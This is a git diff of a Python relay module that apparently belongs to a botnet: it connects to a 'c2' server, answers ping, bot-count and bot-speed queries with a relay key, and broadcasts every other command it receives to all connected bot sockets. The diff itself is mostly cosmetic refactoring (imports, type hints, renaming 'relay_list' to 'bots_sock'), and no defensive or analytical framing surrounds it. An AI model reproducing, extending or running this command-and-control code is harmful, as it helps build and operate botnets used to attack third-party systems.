@@ -1,6 +1,11 @@
-import time
-from socket import socket as Sock
-from socket import SOL_SOCKET, SO_KEEPALIVE, AF_INET, SOCK_STREAM
+from time import sleep
+from socket import (
+    socket as Sock,
+    SOL_SOCKET,
+    SO_KEEPALIVE,
+    AF_INET,
+    SOCK_STREAM,
+)
 from .config import RelayConfig
 
 class Relay():
@@ -20,8 +25,8 @@ class Relay():
         self,
         s: Sock,
         data: str,
-        escape=True,
-        reset=True,
+        escape: bool = True,
+        reset: bool = True,
     ) -> None:
         if reset: data += self.config.COLOR_RESET
         if escape: data += '\r\n'
@@ -34,11 +39,11 @@ class Relay():
     ) -> None:
         self.log(f"send {data}")
 
-        for relay in self.config.relay_list.copy().keys():
-            try: self.send(relay, f'{data}', False, False)
+        for bot in self.config.bots_sock.copy().keys():
+            try: self.send(bot, f'{data}', False, False)
             except Exception:
-                self.config.relay_list.pop(relay)
-                relay.close()
+                self.config.bots_sock.pop(bot)
+                bot.close()
 
     def relay(self):
         c2: Sock = Sock(AF_INET, SOCK_STREAM)
@@ -68,7 +73,7 @@ class Relay():
 
             except Exception:
                 self.log("relay offline, will retry later")
-                time.sleep(self.config.relay_time.RELAY)
+                sleep(self.config.relay_time.RELAY)
 
         while 1:
             try:
@@ -83,12 +88,12 @@ class Relay():
 
                 match command:
                     case 'RPING': c2.send(f'RPONG[p:{self.config.RELAY_KEY}]'.encode())
-                    case 'RNETSPEED': c2.send(str(sum(self.config.speed)).encode())
-                    case 'RNETBOTS': c2.send(str(len(self.config.bots)).encode())
+                    case 'RNETSPEED': c2.send(str(self.config.bot_speed).encode())
+                    case 'RNETBOTS': c2.send(str(len(self.config.bots_sock)).encode())
                     case _: self.broadcast(data)
 
             except Exception: break
 
         c2.close()
-        time.sleep(self.config.relay_time.RELAY)
+        sleep(self.config.relay_time.RELAY)
         self.relay()
